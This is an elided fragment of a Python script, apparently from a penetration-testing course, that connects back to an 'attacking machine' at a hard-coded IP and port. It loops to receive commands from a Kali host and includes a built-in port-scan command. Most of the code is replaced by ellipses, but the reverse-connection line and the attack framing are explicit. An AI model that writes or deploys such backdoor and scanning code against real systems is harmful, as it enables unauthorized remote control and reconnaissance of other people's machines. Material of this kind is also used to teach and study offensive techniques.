...
# Thanks to Hussam Kharias for being a great tutor at http://jo.linkedin.com/in/python2

# This script is a low level port scanner. Syntax is  scan 10.10.10.199:22,80
...
def connect():
    ...
    s.connect(('10.10.10.100', 8080))  # change to your attacking machnie IP address
    ...
    while True: # keep recieving commands from the Kali machine
        ...
        elif 'scan' in command:  # syntax: scan 10.10.10.199:22,80
